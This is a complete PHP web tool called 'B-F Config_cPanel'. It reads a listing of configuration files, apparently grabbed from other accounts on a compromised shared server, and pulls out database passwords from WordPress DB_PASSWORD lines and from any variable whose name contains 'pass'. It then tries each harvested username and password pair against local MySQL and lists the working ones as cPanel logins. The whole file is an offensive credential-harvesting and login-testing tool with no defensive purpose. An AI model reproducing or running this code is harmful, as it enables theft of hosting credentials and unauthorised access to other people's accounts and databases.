<?php
set_time_limit(0);
error_reporting(0);

if (isset($_POST['url'])) {
	$url = $_POST['url'];
}
else {
	$url = 'http://www.';
}

echo '<!DOCTYPE HTML>
<html>
<head>
<title>B-F Config_cPanel</title>
<style type="text/css">

body{
   margin : auto;
   background-color:#f6f6f6;
   color: #339999;
   font-family: tahoma, geneva, lucida,lucida grande, arial, helvetica, sans-serif;
   font-family: 14px;
   text-align: center;
    font-weight: bold ;
}

input,textarea,select{
font-weight: bold;
color: #000000;
border: 1px solid #CCCCCC;
background-color: white;
padding: 3px;
border-radius: 7px;
}

input:focus{

 box-shadow: 0px 0px 5px #009F9F;

}
#footer  {

color: #000000;
font-family: 14px;
text-shadow: 0px 0px 1px #000000;
font-weight: normal;
}
a{
  text-decoration: none;
  color:#333333;
}
</style>
</head>
<body>
<div id="tool">
<H1 style="color: #444444; text-shadow: 0px 0px 1px #000000";text-align: center;>B-F Config_cPanel</H1>
<form method="POST">
<input name="url" type="text" value="' . $url . '" size="40" />
<input type="submit" value="Start >" />
</form><br /><br />';

if (isset($_POST['url'])) {
	if (!file_get_contents($url)) {
		echo 'Error. Invalid URL.';
	}
	else {
		$a = 0;
		foreach(get_data($url) as $info) {
			if (login($info[0], $info[1])) {
				echo "<b style=' color: #808080 ; text-shadow:0px 0px 1px #808080 ;'>[+] Username & Password :</b>  <b style=' color: #0000FF ; text-shadow:0px 0px 1px #0000FF ;'>[$info[0]]</b> <b style=' color: #CC0000; text-shadow:0px 0px 1px #CC0000;'>[$info[1]]</b><br />";
				$a++;
			}
		}

		echo "<b style=' color: #808080 ; text-shadow:0px 0px 1px #808080 ;'><hr>$a Cpanel Founded.<br />";
	}
}

echo '<br /><br /><br /><br /><div id="footer">|| Idea :: Mr.Alsa3ek || Programming :: G-B || Designer :: Al-Swisre || </div>
</div></body>
</html>';

function ex($a, $b, $text)
{
	$explode = explode($a, $text);
	$explode = explode($b, $explode[1]);
	return $explode[0];
}

function login($user, $pass)
{
	$c = @mysql_connect('localhost', $user, $pass);
	if ($c) {
		mysql_close($c);
		return true;
	}
	else {
		return false;
	}
}

function get_data($url)
{
	$ar = array(
		'1.txt',
		'2.txt',
		'3.txt',
		'4.txt',
		'5.txt',
		'6.txt',
		'7.txt',
		'8.txt',
		'9.txt',
		'0.txt'
	);
	$src = file_get_contents($url);
	$files = explode('<a href="', $src);
	$data = array();
	foreach($files as $id => $file) {
		if ($id == 0) {
			continue;
		}

		$file = explode('">', $file);
		$file = trim($file[0]);
		if (!eregi('.txt', $file)) {
			continue;
		}

		$src = file_get_contents("$url/$file");
		if (!$src) {
			continue;
		}

		$user = str_replace($ar, '', $file);
		$user = str_replace($ar, '', $user . '.txt');
		$user = str_replace($ar, '', $user . '.txt');
		$user = trim(str_replace('.txt', '', $user));
		if (eregi("WordPress", $src)) {
			$pass = ex("define('DB_PASSWORD', '", "');", $src);
			$data[] = array(
				$user,
				$pass
			);
		}
		else {
			$tokens = token_get_all($src);
			foreach($tokens as $token) {
				if (!$token[1]) {
					continue;
				}

				$tokenname = token_name($token[0]);
				if ($tokenname != 'T_VARIABLE') {
					continue;
				}

				$var = $token[1];
				if (eregi('pass', $var)) {
					$f = str_replace(' ', '', ex($var, ';', $src));
					$a = trim(ex("='", "'", $f));
					$b = trim(ex('"', '"', $f));
					if ($a != '') {
						$pass = $a;
					}
					elseif ($b != '') {
						$pass = $b;
					}

					if ($pass == '') {
						continue;
					}

					$data[] = array(
						$user,
						$pass
					);
				}
			}
		}
	}

	return $data;
};

